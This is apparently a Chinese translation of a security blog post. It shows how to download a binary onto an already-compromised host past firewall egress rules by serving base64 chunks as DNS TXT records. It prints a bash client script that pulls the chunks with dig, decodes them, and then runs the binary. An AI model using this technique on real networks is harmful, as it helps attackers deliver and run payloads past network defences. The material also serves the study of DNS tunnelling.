# 通过dns进行文件下载

0x00 背景
-------

* * *

偶尔会遇到这样的情况，防火墙规则极大的限制外网的访问(这种情况经常是一个白名单来处理，仅仅允许少量的主机和外网产生连接)想要下载一下二进制文件到目标主机上，就会很麻烦。

我们来假设这样的一个情景：你已经拥有在上述情况下的主机、需要和你的本机传输工具或者数据。在这个情景下面、你被限制了下载，有一个好办法来突破这种限制，那就是通过DNS查询的来获得想要的数据。

如果目标机器的设定的DNS(或者任何只要目标主机能够在网络上访问的DNS服务器)能够在网络上做DNS查询。那就能够下载想要的二进制文件。

0x02 原理
-------

* * *

不了解这项技术的人可能以为是下面这样的流程:

```
目标主机<---->网络上的DNS服务器<---->注册域名服务器<---->攻击者的远端主机

```

其实是这样的流程：

```
目标主机<---->构建的DNS服务器

```

只要目标主机能够和搭建的DNS服务器进行DNS解析就可以实现。

方法就是在服务端通过base64来编码这些特殊文件，对编码后的文件分块，同时添加到DNS Server的记录中，然后在目标主机上进行域名的解析请求，DNS服务器返回base64编码，在对base64编码进行解码，这样就实现了文件下载。

0x03 实现
-------

* * *

使用方法：

```
1、对需要运行server.py脚本的服务器进行配置
2、在服务器上，执行python server.py -f fielname
3、在客户端上，运行sh client.sh dns.testdomain.com
4、这时你应该看到client和server开始产生base64的调试输出。client会把base64的编码写到本地文件中，同时在结束传输时解码

```

### 0x03a Python代码导入了几个库，这些库可能需要单独安装:

dns和argparse，在安装argparse的时候可能会报错，根据报错安装所需的库，即可正常运行server.py

PS:在https://pypi.python.org/ 能够下载到

server.py有三个参数：

```
-f  指定需要分割的二进制文件
-q  静默模式，不在终端上输出日志信息
-s  指定开始的dns解析的子域，必须设置成一个数字client.sh中的i，必须和-s指定的一样。默认是0

```

### 0x03b 在server上运行server.py，创建DNS服务器，a.out是一个二进制文件。

![enter image description here](http://drops.javaweb.org/uploads/images/75753a5029dc34595e0fe2adc7d7be6d9d08358a.jpg)

在目标主机上运行

### 0x03c sh client.sh domain

会产生以下输出

![enter image description here](http://drops.javaweb.org/uploads/images/abe9e17d94827c0d883919005e3ed7f8f9b9ab1c.jpg)

### 0x03d 脚本会对接受的base64的编码进行解码，添加执行权限后就可执行，执行二进制文件。

![enter image description here](http://drops.javaweb.org/uploads/images/1beb3a0203bca367145661ec821707b4a60ff830.jpg)

0x04 源码
-------

* * *

server.py下载地址

[https://github.com/breenmachine/dnsftp](https://github.com/breenmachine/dnsftp)

client.sh脚本

```
#!/bin/bash
error=';; connection timed out; no servers could be reached'
i=0
echo ''> output.b64
while :
do
  RESP=`dig +short $i.$1 TXT | cut -d'"' -f 2`
  if [ "$RESP" = "$error" ];
  then
    echo "Timeout - done"
    break
  fi
  echo -ne $RESP >> output.b64
  echo $RESP
  i=$((i+1))
done
cat output.b64 | base64 -d >> output

```

文件打包下载：[dnsftp-master.zip](http://static.wooyun.org/20141017/2014101715211783609.zip)

翻译出处：

[http://breenmachine.blogspot.com/2014/03/downloading-files-through-recursive-dns.html](http://breenmachine.blogspot.com/2014/03/downloading-files-through-recursive-dns.html)